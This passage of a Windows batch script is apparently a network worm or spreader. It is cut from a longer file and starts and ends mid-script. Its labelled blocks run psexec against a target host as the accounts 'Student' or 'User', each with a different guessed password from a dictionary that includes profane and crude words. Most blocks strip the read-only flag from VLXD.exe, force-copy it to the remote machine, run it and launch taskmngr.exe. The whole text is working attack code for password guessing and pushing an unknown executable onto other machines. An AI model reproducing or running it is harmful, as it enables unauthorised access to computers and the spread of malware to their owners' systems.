   psexec \\%1 -u Student -p "danger" -d taskmngr.exe
   goto end
   :Studentweiner
   psexec \\%1 -u Student -p "weiner" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "weiner" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "weiner" -d taskmngr.exe
   psexec \\%1 -u Student -p "weiner" -d VLXD.exe -o
   psexec \\%1 -u Student -p "weiner" -d taskmngr.exe
   goto end
   :Studentelectrical
   psexec \\%1 -u Student -p "electrical" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "electrical" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "electrical" -d taskmngr.exe
   psexec \\%1 -u Student -p "electrical" -d VLXD.exe -o
   psexec \\%1 -u Student -p "electrical" -d taskmngr.exe
   goto end
   :Studentelectric
   psexec \\%1 -u Student -p "electric" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "electric" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "electric" -d taskmngr.exe
   psexec \\%1 -u Student -p "electric" -d VLXD.exe -o
   psexec \\%1 -u Student -p "electric" -d taskmngr.exe
   goto end
   :Studentelectricity
   psexec \\%1 -u Student -p "electricity" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "electricity" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "electricity" -d taskmngr.exe
   psexec \\%1 -u Student -p "electricity" -d VLXD.exe -o
   psexec \\%1 -u Student -p "electricity" -d taskmngr.exe
   goto end
   :Studentpenis
   psexec \\%1 -u Student -p "penis" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "penis" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "penis" -d taskmngr.exe
   psexec \\%1 -u Student -p "penis" -d VLXD.exe -o
   psexec \\%1 -u Student -p "penis" -d taskmngr.exe
   goto end
   :Studentcent
   psexec \\%1 -u Student -p "cent" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "cent" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "cent" -d taskmngr.exe
   psexec \\%1 -u Student -p "cent" -d VLXD.exe -o
   psexec \\%1 -u Student -p "cent" -d taskmngr.exe
   goto end
   :Student50cent
   psexec \\%1 -u Student -p "50cent" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "50cent" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "50cent" -d taskmngr.exe
   psexec \\%1 -u Student -p "50cent" -d VLXD.exe -o
   psexec \\%1 -u Student -p "50cent" -d taskmngr.exe
   goto end
   :Studenteminem
   psexec \\%1 -u Student -p "eminem" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "eminem" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "eminem" -d taskmngr.exe
   psexec \\%1 -u Student -p "eminem" -d VLXD.exe -o
   psexec \\%1 -u Student -p "eminem" -d taskmngr.exe
   goto end
   :Studentvagina
   psexec \\%1 -u Student -p "vagina" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "vagina" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "vagina" -d taskmngr.exe
   psexec \\%1 -u Student -p "vagina" -d VLXD.exe -o
   psexec \\%1 -u Student -p "vagina" -d taskmngr.exe
   goto end
   :Studentcunt
   psexec \\%1 -u Student -p "cunt" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "cunt" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "cunt" -d taskmngr.exe
   psexec \\%1 -u Student -p "cunt" -d VLXD.exe -o
   psexec \\%1 -u Student -p "cunt" -d taskmngr.exe
   goto end
   :Studentpussy
   psexec \\%1 -u Student -p "pussy" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "pussy" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "pussy" -d taskmngr.exe
   psexec \\%1 -u Student -p "pussy" -d VLXD.exe -o
   psexec \\%1 -u Student -p "pussy" -d taskmngr.exe
   goto end
   :Studentcock
   psexec \\%1 -u Student -p "cock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "cock" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "cock" -d taskmngr.exe
   psexec \\%1 -u Student -p "cock" -d VLXD.exe -o
   psexec \\%1 -u Student -p "cock" -d taskmngr.exe
   goto end
   :Studentdick
   psexec \\%1 -u Student -p "dick" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "dick" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "dick" -d taskmngr.exe
   psexec \\%1 -u Student -p "dick" -d VLXD.exe -o
   psexec \\%1 -u Student -p "dick" -d taskmngr.exe
   psexec \\%1 -u Student -p dick -c -f -d VLXD.exe
   goto end
   :Studentshithead
   psexec \\%1 -u Student -p "shithead" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "shithead" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "shithead" -d taskmngr.exe
   psexec \\%1 -u Student -p "shithead" -d VLXD.exe -o
   psexec \\%1 -u Student -p "shithead" -d taskmngr.exe
   goto end
   :Studentshotgun
   psexec \\%1 -u Student -p "shotgun" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "shotgun" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "shotgun" -d taskmngr.exe
   psexec \\%1 -u Student -p "shotgun" -d VLXD.exe -o
   psexec \\%1 -u Student -p "shotgun" -d taskmngr.exe
   goto end
   :Studentblunt
   psexec \\%1 -u Student -p "blunt" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "blunt" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "blunt" -d taskmngr.exe
   psexec \\%1 -u Student -p "blunt" -d VLXD.exe -o
   psexec \\%1 -u Student -p "blunt" -d taskmngr.exe
   goto end
   :Studentglock
   psexec \\%1 -u Student -p "glock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "glock" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "glock" -d taskmngr.exe
   psexec \\%1 -u Student -p "glock" -d VLXD.exe -o
   psexec \\%1 -u Student -p "glock" -d taskmngr.exe
   goto end
   :Studentexecutable
   psexec \\%1 -u Student -p "executable" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "executable" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "executable" -d taskmngr.exe
   psexec \\%1 -u Student -p "executable" -d VLXD.exe -o
   psexec \\%1 -u Student -p "executable" -d taskmngr.exe
   goto end
   :Studentbong
   psexec \\%1 -u Student -p "bong" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "bong" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "bong" -d taskmngr.exe
   psexec \\%1 -u Student -p "bong" -d VLXD.exe -o
   psexec \\%1 -u Student -p "bong" -d taskmngr.exe
   goto end
   :Studentdildo
   psexec \\%1 -u Student -p "dildo" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "dildo" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "dildo" -d taskmngr.exe
   psexec \\%1 -u Student -p "dildo" -d VLXD.exe -o
   psexec \\%1 -u Student -p "dildo" -d taskmngr.exe
   goto end
   :Studentbaseball
   psexec \\%1 -u Student -p "baseball" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "baseball" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "baseball" -d taskmngr.exe
   psexec \\%1 -u Student -p "baseball" -d VLXD.exe -o
   psexec \\%1 -u Student -p "baseball" -d taskmngr.exe
   goto end
   :Studentbasketball
   psexec \\%1 -u Student -p "basketball" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "basketball" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "basketball" -d taskmngr.exe
   psexec \\%1 -u Student -p "basketball" -d VLXD.exe -o
   psexec \\%1 -u Student -p "basketball" -d taskmngr.exe
   goto end
   :Studentfootball
   psexec \\%1 -u Student -p "football" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "football" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "football" -d taskmngr.exe
   psexec \\%1 -u Student -p "football" -d VLXD.exe -o
   psexec \\%1 -u Student -p "football" -d taskmngr.exe
   goto end
   :Studentsoccer
   psexec \\%1 -u Student -p "soccer" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "soccer" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "soccer" -d taskmngr.exe
   psexec \\%1 -u Student -p "soccer" -d VLXD.exe -o
   psexec \\%1 -u Student -p "soccer" -d taskmngr.exe
   goto end
   :Studentpot
   psexec \\%1 -u Student -p "pot" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "pot" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "pot" -d taskmngr.exe
   psexec \\%1 -u Student -p "pot" -d VLXD.exe -o
   psexec \\%1 -u Student -p "pot" -d taskmngr.exe
   goto end
   :Studentdope
   psexec \\%1 -u Student -p "dope" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "dope" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "dope" -d taskmngr.exe
   psexec \\%1 -u Student -p "dope" -d VLXD.exe -o
   psexec \\%1 -u Student -p "dope" -d taskmngr.exe
   goto end
   :Studentmaryjane
   psexec \\%1 -u Student -p "maryjane" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "maryjane" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "maryjane" -d taskmngr.exe
   psexec \\%1 -u Student -p "maryjane" -d VLXD.exe -o
   psexec \\%1 -u Student -p "maryjane" -d taskmngr.exe
   goto end
   :Studentmarijuana
   psexec \\%1 -u Student -p "marijuana" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "marijuana" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "marijuana" -d taskmngr.exe
   psexec \\%1 -u Student -p "marijuana" -d VLXD.exe -o
   psexec \\%1 -u Student -p "marijuana" -d taskmngr.exe
   goto end
   :Studentmoney
   psexec \\%1 -u Student -p "money" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "money" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "money" -d taskmngr.exe
   psexec \\%1 -u Student -p "money" -d VLXD.exe -o
   psexec \\%1 -u Student -p "money" -d taskmngr.exe
   goto end
   :Studentgirl
   psexec \\%1 -u Student -p "girl" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "girl" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "girl" -d taskmngr.exe
   psexec \\%1 -u Student -p "girl" -d VLXD.exe -o
   psexec \\%1 -u Student -p "girl" -d taskmngr.exe
   goto end
   :Studentgirls
   psexec \\%1 -u Student -p "girls" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "girls" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "girls" -d taskmngr.exe
   psexec \\%1 -u Student -p "girls" -d VLXD.exe -o
   psexec \\%1 -u Student -p "girls" -d taskmngr.exe
   goto end
   :Studentwoman
   psexec \\%1 -u Student -p "woman" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "woman" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "woman" -d taskmngr.exe
   psexec \\%1 -u Student -p "woman" -d VLXD.exe -o
   psexec \\%1 -u Student -p "woman" -d taskmngr.exe
   goto end
   :Studentwomen
   psexec \\%1 -u Student -p "women" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "women" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "women" -d taskmngr.exe
   psexec \\%1 -u Student -p "women" -d VLXD.exe -o
   psexec \\%1 -u Student -p "women" -d taskmngr.exe
   goto end
   :Studentfemale
   psexec \\%1 -u Student -p "female" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "female" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "female" -d taskmngr.exe
   psexec \\%1 -u Student -p "female" -d VLXD.exe -o
   psexec \\%1 -u Student -p "female" -d taskmngr.exe
   goto end
   :Studentamerica
   psexec \\%1 -u Student -p "america" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "america" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "america" -d taskmngr.exe
   psexec \\%1 -u Student -p "america" -d VLXD.exe -o
   psexec \\%1 -u Student -p "america" -d taskmngr.exe
   goto end
   :Studentusa
   psexec \\%1 -u Student -p "usa" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "usa" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "usa" -d taskmngr.exe
   psexec \\%1 -u Student -p "usa" -d VLXD.exe -o
   psexec \\%1 -u Student -p "usa" -d taskmngr.exe
   goto end
   :Studentgod
   psexec \\%1 -u Student -p "god" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "god" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "god" -d taskmngr.exe
   psexec \\%1 -u Student -p "god" -d VLXD.exe -o
   psexec \\%1 -u Student -p "god" -d taskmngr.exe
   goto end
   :Studentjesus
   psexec \\%1 -u Student -p "jesus" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "jesus" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "jesus" -d taskmngr.exe
   psexec \\%1 -u Student -p "jesus" -d VLXD.exe -o
   psexec \\%1 -u Student -p "jesus" -d taskmngr.exe
   goto end
   :Studentcomputer
   psexec \\%1 -u Student -p "computer" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "computer" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "computer" -d taskmngr.exe
   psexec \\%1 -u Student -p "computer" -d VLXD.exe -o
   psexec \\%1 -u Student -p "computer" -d taskmngr.exe
   goto end
   :Studenttechnology
   psexec \\%1 -u Student -p "technology" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "technology" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "technology" -d taskmngr.exe
   psexec \\%1 -u Student -p "technology" -d VLXD.exe -o
   psexec \\%1 -u Student -p "technology" -d taskmngr.exe
   goto end
   :Studentporn
   psexec \\%1 -u Student -p "porn" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "porn" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "porn" -d taskmngr.exe
   psexec \\%1 -u Student -p "porn" -d VLXD.exe -o
   psexec \\%1 -u Student -p "porn" -d taskmngr.exe
   goto end
   :Studenthack
   psexec \\%1 -u Student -p "hack" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "hack" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "hack" -d taskmngr.exe
   psexec \\%1 -u Student -p "hack" -d VLXD.exe -o
   psexec \\%1 -u Student -p "hack" -d taskmngr.exe
   goto end
   :Studentclock
   psexec \\%1 -u Student -p "clock" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "clock" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "clock" -d taskmngr.exe
   psexec \\%1 -u Student -p "clock" -d VLXD.exe -o
   psexec \\%1 -u Student -p "clock" -d taskmngr.exe
   goto end
   :Studentchurch
   psexec \\%1 -u Student -p "church" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "church" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "church" -d taskmngr.exe
   psexec \\%1 -u Student -p "church" -d VLXD.exe -o
   psexec \\%1 -u Student -p "church" -d taskmngr.exe
   goto end
   :Studenttemp
   psexec \\%1 -u Student -p "temp" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u Student -p "temp" -f -c -d VLXD.exe -o
   psexec \\%1 -u Student -p "temp" -d taskmngr.exe
   psexec \\%1 -u Student -p "temp" -d VLXD.exe -o
   psexec \\%1 -u Student -p "temp" -d taskmngr.exe
   goto end
   :User
   psexec \\%1 -u User -p "" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "" -d taskmngr.exe
   psexec \\%1 -u User -p "" -d VLXD.exe -o
   psexec \\%1 -u User -p "" -d taskmngr.exe
   goto end
   :Userpass123
   psexec \\%1 -u User -p "pass123" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "pass123" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "pass123" -d taskmngr.exe
   psexec \\%1 -u User -p "pass123" -d VLXD.exe -o
   psexec \\%1 -u User -p "pass123" -d taskmngr.exe
   goto end
   :Usersomething
   psexec \\%1 -u User -p "something" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "something" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "something" -d taskmngr.exe
   psexec \\%1 -u User -p "something" -d VLXD.exe -o
   psexec \\%1 -u User -p "something" -d taskmngr.exe
   goto end
   :Usermypass
   psexec \\%1 -u User -p "mypass" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "mypass" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "mypass" -d taskmngr.exe
   psexec \\%1 -u User -p "mypass" -d VLXD.exe -o
   psexec \\%1 -u User -p "mypass" -d taskmngr.exe
   goto end
   :Userlogin
   psexec \\%1 -u User -p "login" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "login" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "login" -d taskmngr.exe
   psexec \\%1 -u User -p "login" -d VLXD.exe -o
   psexec \\%1 -u User -p "login" -d taskmngr.exe
   goto end
   :Useraccess
   psexec \\%1 -u User -p "access" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "access" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "access" -d taskmngr.exe
   psexec \\%1 -u User -p "access" -d VLXD.exe -o
   psexec \\%1 -u User -p "access" -d taskmngr.exe
   goto end
   :Userpassword
   psexec \\%1 -u User -p "password" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "password" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "password" -d taskmngr.exe
   psexec \\%1 -u User -p "password" -d VLXD.exe -o
   psexec \\%1 -u User -p "password" -d taskmngr.exe
   goto end
   :Usermatrix
   psexec \\%1 -u User -p "matrix" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "matrix" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "matrix" -d taskmngr.exe
   psexec \\%1 -u User -p "matrix" -d VLXD.exe -o
   psexec \\%1 -u User -p "matrix" -d taskmngr.exe
   goto end
   :Usersecurity
   psexec \\%1 -u User -p "security" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "security" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "security" -d taskmngr.exe
   psexec \\%1 -u User -p "security" -d VLXD.exe -o
   psexec \\%1 -u User -p "security" -d taskmngr.exe
   goto end
   :Usersuccess
   psexec \\%1 -u User -p "success" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "success" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "success" -d taskmngr.exe
   psexec \\%1 -u User -p "success" -d VLXD.exe -o
   psexec \\%1 -u User -p "success" -d taskmngr.exe
   goto end
   :Userspecial
   psexec \\%1 -u User -p "special" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "special" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "special" -d taskmngr.exe
   psexec \\%1 -u User -p "special" -d VLXD.exe -o
   psexec \\%1 -u User -p "special" -d taskmngr.exe
   goto end
   :Userultra
   psexec \\%1 -u User -p "ultra" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "ultra" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "ultra" -d taskmngr.exe
   psexec \\%1 -u User -p "ultra" -d VLXD.exe -o
   psexec \\%1 -u User -p "ultra" -d taskmngr.exe
   goto end
   :Userpass
   psexec \\%1 -u User -p "pass" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "pass" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "pass" -d taskmngr.exe
   psexec \\%1 -u User -p "pass" -d VLXD.exe -o
   psexec \\%1 -u User -p "pass" -d taskmngr.exe
   goto end
   :Userenable
   psexec \\%1 -u User -p "enable" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "enable" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "enable" -d taskmngr.exe
   psexec \\%1 -u User -p "enable" -d VLXD.exe -o
   psexec \\%1 -u User -p "enable" -d taskmngr.exe
   goto end
   :Userpasswd
   psexec \\%1 -u User -p "passwd" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "passwd" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "passwd" -d taskmngr.exe
   psexec \\%1 -u User -p "passwd" -d VLXD.exe -o
   psexec \\%1 -u User -p "passwd" -d taskmngr.exe
   goto end
   :Userinternet
   psexec \\%1 -u User -p "internet" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "internet" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "internet" -d taskmngr.exe
   psexec \\%1 -u User -p "internet" -d VLXD.exe -o
   psexec \\%1 -u User -p "internet" -d taskmngr.exe
   goto end
   :Usernetwork
   psexec \\%1 -u User -p "network" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "network" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "network" -d taskmngr.exe
   psexec \\%1 -u User -p "network" -d VLXD.exe -o
   psexec \\%1 -u User -p "network" -d taskmngr.exe
   goto end
   :Useredu
   psexec \\%1 -u User -p "edu" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "edu" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "edu" -d taskmngr.exe
   psexec \\%1 -u User -p "edu" -d VLXD.exe -o
   psexec \\%1 -u User -p "edu" -d taskmngr.exe
   goto end
   :Userowner
   psexec \\%1 -u User -p "owner" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "owner" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "owner" -d taskmngr.exe
   psexec \\%1 -u User -p "owner" -d VLXD.exe -o
   psexec \\%1 -u User -p "owner" -d taskmngr.exe
   goto end
   :Userlocal
   psexec \\%1 -u User -p "local" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "local" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "local" -d taskmngr.exe
   psexec \\%1 -u User -p "local" -d VLXD.exe -o
   psexec \\%1 -u User -p "local" -d taskmngr.exe
   goto end
   :Userremote
   psexec \\%1 -u User -p "remote" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "remote" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "remote" -d taskmngr.exe
   psexec \\%1 -u User -p "remote" -d VLXD.exe -o
   psexec \\%1 -u User -p "remote" -d taskmngr.exe
   goto end
   :Userlan
   psexec \\%1 -u User -p "lan" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "lan" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "lan" -d taskmngr.exe
   psexec \\%1 -u User -p "lan" -d VLXD.exe -o
   psexec \\%1 -u User -p "lan" -d taskmngr.exe
   goto end
   :Userroot
   psexec \\%1 -u User -p "root" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "root" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "root" -d taskmngr.exe
   psexec \\%1 -u User -p "root" -d VLXD.exe -o
   psexec \\%1 -u User -p "root" -d taskmngr.exe
   goto end
   :Userbitch
   psexec \\%1 -u User -p "bitch" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "bitch" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "bitch" -d taskmngr.exe
   psexec \\%1 -u User -p "bitch" -d VLXD.exe -o
   psexec \\%1 -u User -p "bitch" -d taskmngr.exe
   goto end
   :Userfault
   psexec \\%1 -u User -p "fault" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "fault" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "fault" -d taskmngr.exe
   psexec \\%1 -u User -p "fault" -d VLXD.exe -o
   psexec \\%1 -u User -p "fault" -d taskmngr.exe
   goto end
   :Usercat
   psexec \\%1 -u User -p "cat" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "cat" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "cat" -d taskmngr.exe
   psexec \\%1 -u User -p "cat" -d VLXD.exe -o
   psexec \\%1 -u User -p "cat" -d taskmngr.exe
   goto end
   :User911
   psexec \\%1 -u User -p "911" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "911" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "911" -d taskmngr.exe
   psexec \\%1 -u User -p "911" -d VLXD.exe -o
   psexec \\%1 -u User -p "911" -d taskmngr.exe
   goto end
   :Usertowers
   psexec \\%1 -u User -p "towers" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "towers" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "towers" -d taskmngr.exe
   psexec \\%1 -u User -p "towers" -d VLXD.exe -o
   psexec \\%1 -u User -p "towers" -d taskmngr.exe
   goto end
   :User123
   psexec \\%1 -u User -p "123" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "123" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "123" -d taskmngr.exe
   psexec \\%1 -u User -p "123" -d VLXD.exe -o
   psexec \\%1 -u User -p "123" -d taskmngr.exe
   goto end
   :User1234
   psexec \\%1 -u User -p "1234" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "1234" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "1234" -d taskmngr.exe
   psexec \\%1 -u User -p "1234" -d VLXD.exe -o
   psexec \\%1 -u User -p "1234" -d taskmngr.exe
   goto end
   :User12345
   psexec \\%1 -u User -p "12345" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "12345" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "12345" -d taskmngr.exe
   psexec \\%1 -u User -p "12345" -d VLXD.exe -o
   psexec \\%1 -u User -p "12345" -d taskmngr.exe
   goto end
   :User123456
   psexec \\%1 -u User -p "123456" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "123456" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "123456" -d taskmngr.exe
   psexec \\%1 -u User -p "123456" -d VLXD.exe -o
   psexec \\%1 -u User -p "123456" -d taskmngr.exe
   goto end
   :User654321
   psexec \\%1 -u User -p "654321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "654321" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "654321" -d taskmngr.exe
   psexec \\%1 -u User -p "654321" -d VLXD.exe -o
   psexec \\%1 -u User -p "654321" -d taskmngr.exe
   goto end
   :User54321
   psexec \\%1 -u User -p "54321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "54321" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "54321" -d taskmngr.exe
   psexec \\%1 -u User -p "54321" -d VLXD.exe -o
   psexec \\%1 -u User -p "54321" -d taskmngr.exe
   goto end
   :User321
   psexec \\%1 -u User -p "321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "321" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "321" -d taskmngr.exe
   psexec \\%1 -u User -p "321" -d VLXD.exe -o
   psexec \\%1 -u User -p "321" -d taskmngr.exe
   goto end
   :UserUser
   psexec \\%1 -u User -p "User" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "User" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "User" -d taskmngr.exe
   psexec \\%1 -u User -p "User" -d VLXD.exe -o
   psexec \\%1 -u User -p "User" -d taskmngr.exe
   goto end
   :User4321
   psexec \\%1 -u User -p "4321" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "4321" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "4321" -d taskmngr.exe
   psexec \\%1 -u User -p "4321" -d VLXD.exe -o
   psexec \\%1 -u User -p "4321" -d taskmngr.exe
   goto end
   :Usertemp
   psexec \\%1 -u User -p "temp" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "temp" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "temp" -d taskmngr.exe
   psexec \\%1 -u User -p "temp" -d VLXD.exe -o
   psexec \\%1 -u User -p "temp" -d taskmngr.exe
   goto end
   :Useruser
   psexec \\%1 -u User -p "user" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "user" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "user" -d taskmngr.exe
   psexec \\%1 -u User -p "user" -d VLXD.exe -o
   psexec \\%1 -u User -p "user" -d taskmngr.exe
   goto end
   :Userbootie
   psexec \\%1 -u User -p "bootie" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "bootie" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "bootie" -d taskmngr.exe
   psexec \\%1 -u User -p "bootie" -d VLXD.exe -o
   psexec \\%1 -u User -p "bootie" -d taskmngr.exe
   goto end
   :Userpoop
   psexec \\%1 -u User -p "poop" -d attrib.exe -r VLXD.exe
   psexec \\%1 -u User -p "poop" -f -c -d VLXD.exe -o
   psexec \\%1 -u User -p "poop" -d taskmngr.exe
   psexec \\%1 -u User -p "poop" -d VLXD.exe -o
